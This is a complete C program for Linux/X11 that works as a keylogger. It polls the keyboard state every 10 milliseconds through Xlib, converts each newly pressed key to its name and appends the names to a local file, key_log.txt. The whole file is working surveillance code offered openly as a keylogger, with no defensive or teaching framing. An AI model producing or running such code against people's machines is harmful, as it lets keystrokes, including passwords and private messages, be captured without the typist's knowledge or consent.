#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// File to save keystrokes
const char *log_file = "key_log.txt";

// Function to log keys to a file
void log_key(const char *key) {
    FILE *file = fopen(log_file, "a");
    if (file != NULL) {
        fprintf(file, "%s", key);
        fclose(file);
    }
}

int main() {
    Display *display;
    char key_state[32];
    char prev_key_state[32] = {0};

    // Open connection to X server
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        return 1;
    }

    printf("Keylogger is running... Press Ctrl+C to stop.\n");

    while (1) {
        XQueryKeymap(display, key_state);

        for (int keycode = 8; keycode <= 255; keycode++) {
            int key_byte = keycode / 8;
            int key_bit = keycode % 8;

            // Check if the key was just pressed (not held down)
            if ((key_state[key_byte] & (1 << key_bit)) &&
                !(prev_key_state[key_byte] & (1 << key_bit))) {
                KeySym keysym = XkbKeycodeToKeysym(display, keycode, 0, 0);
                if (keysym) {
                    const char *key = XKeysymToString(keysym);
                    if (key) {
                        log_key(key);
                    }
                }
            }
        }

        // Copy current state to previous state for next iteration
        memcpy(prev_key_state, key_state, sizeof(key_state));

        usleep(10000); // Sleep to reduce CPU usage
    }

    XCloseDisplay(display);
    return 0;
}
